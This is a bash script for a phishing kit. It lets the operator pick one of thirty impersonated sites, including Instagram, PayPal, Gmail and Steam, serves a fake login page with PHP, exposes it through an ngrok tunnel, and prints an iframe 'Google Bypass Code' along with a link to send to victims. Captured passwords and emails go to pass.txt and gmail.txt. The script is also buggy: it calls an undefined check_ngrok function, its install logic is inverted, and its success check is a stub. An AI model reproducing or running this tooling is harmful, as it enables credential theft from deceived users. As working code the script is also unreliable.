#!/bin/bash

# Function to select the website
select_site() {
    echo -e "\nChoose a site:"
    echo -e "  [1]---Instagram     [11]---AirtelSim      [21]---Wordpress"
    echo -e "  [2]---Facebook      [12]---Amazon         [22]---JioRouter"
    echo -e "  [3]---Sociallub     [13]---Apple          [23]---Snapchat"
    echo -e "  [4]---Netflix       [14]---Clasofclans    [24]---Ola"
    echo -e "  [5]---Telegram      [15]---Google         [25]---PayPal"
    echo -e "  [6]---Yahoo         [16]---FreeFire       [26]---Linkedin"
    echo -e "  [7]---Youtube       [17]---Github         [27]---Playstation"
    echo -e "  [8]---Xbox          [18]---Gmail          [28]---Pubg"
    echo -e "  [9]---Wifi          [19]---Outlook        [29]---Shopify"
    echo -e "  [10]---Twitter      [20]---Steam          [30]---SocialClub"
    
    read -p "Enter the option number: " option_num

case $option_num in
        1) site="instagram";;
        2) site="facebook";;
        3) site="socialclub";;
        4) site="netflix";;
        5) site="telegram";;
        6) site="yahoo";;
        7) site="youtube";;
        8) site="xbox";;
        9) site="wifi";;
        10) site="twitter";;
        11) site="airtelsim";;
        12) site="amazon";;
        13) site="apple";;
        14) site="clasofclans";;
        15) site="google";;
        16) site="freefire";;
        17) site="github";;
        18) site="gmail";;
        19) site="outlook";;
        20) site="steam";;
        21) site="wordpress";;
        22) site="jiorouter";;
        23) site="snapchat";;
        24) site="ola";;
        25) site="paypal";;
        26) site="linkedin";;
        27) site="playstation";;
        28) site="pubg";;
        29) site="shopify";;
        30) site="socialclub";;
        *) echo -e "Invalid option";;
    esac
}

get_token() {
    read -p "Enter your Ngrok or Localx token: " token
    ngrok config add-authtoken $token
    }

# Function to perform phishing
phish_site() {
    echo -e "\nPhishing $site"
    
    # Remove pass.txt if exists
    if [[ -e webs/$site/pass.txt ]]; then
        rm -rf webs/$site/pass.txt 2>&1
    fi

    # Remove gmail.txt if exists
    if [[ -e webs/$site/gmail.txt ]]; then
        rm -rf webs/$site/gmail.txt 2>&1
    fi

    # Download Ngrok if not exists
    if [[ ! -e ngrok ]]; then
        echo ""
    else
        echo
        printf "Downloading Ngrok...\n"
        curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok
    fi

    echo -e "Phishing $site completed!"
}

# Function to start local and Ngrok servers
start_servers() {
    echo -e "Starting Host Server..."
    cd webs/$site && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 8
    echo -e "Starting Ngrok Server..."
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 15
    link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
    status=$(curl -s -o /dev/null -I -w "%{http_code}" $link)
    stat=$(echo "$status")
    if [ "$stat" = "200" ];
    then
        echo -e  "Link working code [200]"
        touch bypass.html
        cat > bypass.html << EOF
<iframe name="$site" src="$link" width="100%" height="100%" frameborder="0" scrolling="yes" style="width: 100%;"> </iframe>
EOF
        bypass=$(cat bypass.html)
        echo
        echo -e  "[-------------Google Bypass Code-------------]"
        echo -e  "$bypass"
        echo -e  "[-----------Use This Code in Github----------]"
        echo
        echo -e  "Send This Link: $link"
        checkfound
    else
        echo -e  "Link working code [000]"
        echo
        echo -e  "[-------------Google Bypass Code-------------]"
        echo -e  "$bypass"
        echo -e  "[-----------Use This Code in Github----------]"
        echo
        echo -e  "Send This Link: $link"
        checkfound
    fi
}

# Function to check if phishing was successful
checkfound() {
    # Your code to check if phishing was successful goes here
    echo "Phishing check..."
}

# Main function
main() {
    select_site
    check_ngrok
    get_token
    phish_site
    start_servers
}

# Run the script
main
